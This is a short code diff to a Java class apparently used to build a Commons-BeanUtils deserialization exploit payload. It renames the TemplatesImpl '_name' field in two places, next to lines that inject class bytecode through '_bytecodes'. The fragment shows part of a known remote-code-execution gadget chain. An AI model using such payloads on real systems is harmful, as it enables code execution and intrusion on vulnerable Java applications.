@@ -67,7 +67,7 @@ public class CommonsBeanutils1 {
 
 
         setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes });
-        setFieldValue(templates, "_name", "HelloTemplatesImpl");
+        setFieldValue(templates, "_name", "aaa");
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 
         return templates;
@@ -160,7 +160,7 @@ public class CommonsBeanutils1 {
 
 
         setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes });
-        setFieldValue(templates, "_name", "HelloTemplatesImpl");
+        setFieldValue(templates, "_name", "aaa");
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 
         return templates;
